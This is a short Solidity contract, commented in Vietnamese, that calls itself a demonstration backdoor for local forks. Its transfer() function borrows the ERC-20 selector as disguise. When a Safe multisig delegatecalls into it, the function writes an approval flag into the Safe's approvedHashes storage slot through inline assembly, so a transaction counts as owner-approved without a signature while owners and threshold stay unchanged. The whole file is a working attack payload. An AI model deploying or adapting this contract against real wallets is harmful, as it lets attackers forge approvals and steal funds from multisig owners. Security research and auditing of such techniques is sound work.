// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @notice Minh hoạ cửa hậu (chỉ dùng trên fork cục bộ).
/// Khi Safe delegatecall vào transfer(), ghi approvedHashes[owner][txHash] = 1
/// trong storage của Safe (slot 8). masterCopy/owners/threshold/modules KHÔNG đổi.
contract SleeperImpl {
    uint256 private constant APPROVED_HASHES_SLOT = 8;

    /// Ngụy trang: cùng selector 0xa9059cbb với ERC-20 transfer
    function transfer(address owner, uint256 txHash) external {
        bytes32 inner = keccak256(abi.encode(owner, APPROVED_HASHES_SLOT));
        bytes32 slot = keccak256(abi.encode(bytes32(txHash), inner));
        assembly {
            sstore(slot, 1)
        }
    }
}
